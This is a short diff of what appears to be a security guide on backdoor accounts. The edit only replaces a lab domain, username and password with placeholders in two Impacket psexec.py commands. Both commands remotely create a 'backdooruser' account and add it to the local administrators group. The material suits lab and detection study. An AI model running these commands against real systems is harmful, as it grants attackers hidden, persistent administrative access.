@@ -15,8 +15,8 @@ Attackers often create hidden or backdoor user accounts on compromised systems t
 * Remote execution via Impacket’s `psexec.py` from Kali Linux:
 
   ```bash
-  python3 /usr/share/doc/python3-impacket/examples/psexec.py CYBERSTAR/Dummmmy:Password00000@192.168.189.150 "net user backdooruser SuperSecurePass123! /add"
-  python3 /usr/share/doc/python3-impacket/examples/psexec.py CYBERSTAR/Dummmmy:Password00000@192.168.189.150 "net localgroup administrators backdooruser /add"
+  python3 /usr/share/doc/python3-impacket/examples/psexec.py Domain name/user:Password@192.168.189.150 "net user backdooruser SuperSecurePass123! /add"
+  python3 /usr/share/doc/python3-impacket/examples/psexec.py Domain name/user:Password@192.168.189.150 "net localgroup administrators backdooruser /add"
   ```
 
 
